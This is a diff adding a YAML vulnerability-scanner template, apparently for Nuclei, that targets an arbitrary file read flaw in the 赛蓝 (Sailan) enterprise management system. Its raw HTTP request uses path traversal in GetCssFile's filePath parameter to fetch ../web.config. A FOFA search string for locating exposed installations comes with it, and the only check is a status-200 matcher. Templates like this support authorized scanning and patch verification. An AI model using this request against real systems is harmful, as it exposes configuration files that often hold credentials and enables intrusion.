@@ -1,0 +1,25 @@
+id: poc-hpg111zb4dxkyhbr
+info:
+  name: 赛蓝企业管理系统 GetCssFile 存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hpg111zb4dxkyhbr'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hpg111zb4dxkyhbr
+    fofa: body="www.cailsoft.com" || body="赛蓝企业管理系统"
+http:
+- raw:
+  - 'GET /Utility/GetCssFile?filePath=../web.config HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, lik
+
+    e Gecko) Chrome/75.0.3770.100 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
